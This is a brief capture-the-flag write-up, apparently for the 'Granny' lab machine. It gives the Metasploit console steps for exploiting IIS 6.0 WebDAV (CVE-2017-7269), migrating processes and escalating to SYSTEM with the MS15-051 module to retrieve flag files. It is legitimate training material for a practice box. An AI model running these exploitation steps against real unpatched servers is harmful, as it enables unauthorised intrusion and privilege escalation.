
Granny is very similar to Grandpa, as we shall see.

A quick nmap search,

```
nmap {taget ip}
```

Shows port `80` is open, with one service, `Microsoft IIS version 6.0` which has a remote code execution vulnerability (CVE-2017-7269).

I run metasploit:

```
$ msfconsole

...

msf > search CVE-2017-7269

...

msf > use iis_webdav_upload_asp
```

Using the metasploit module `iis_webdav_upload_asp`, running `options`, I find I need to define `RHOSTS` (or the target ip), `LHOST` (the listening or my local ip), I can then run `exploit`.

```
msf > exploit
```

Running exploit gets me a shell on the target machine, but very little in terms of privileges. As I'm unable to run `getuid` or access the user flag.  At this point I run `ps`, which lists the running processes on this Windows box, and run `migrate 1796` (or some other pid), which is a process owned by `NT AUTHORITY\NETWORK SERVICE`, which I need to run before I run the next exploits.

In metasploit, run `background`, to set the current session to background so I can run `local_exploit_suggester`, which lists some exploits to improve my priv_escalation.

```
msf > background
msf > local_exploit_suggester
...
msf > use ms15_051_client_copy_image
```

In both the `local_exploit_suggester` and `ms15_051_client_copy_image`, when I run options I see that I do need to `set session 1`, or I need to tell metasploit that the next exploit needs to run on the initial `iis_webdav_upload_asp` exploit.

`ms15_051_client_copy_image` gets root access and I am able to find both flags in:

- `C:\Documents and Settings\Administrator\Desktop\root.txt`
- `C:\Documents and Settings\Lakis\Desktop\user.txt`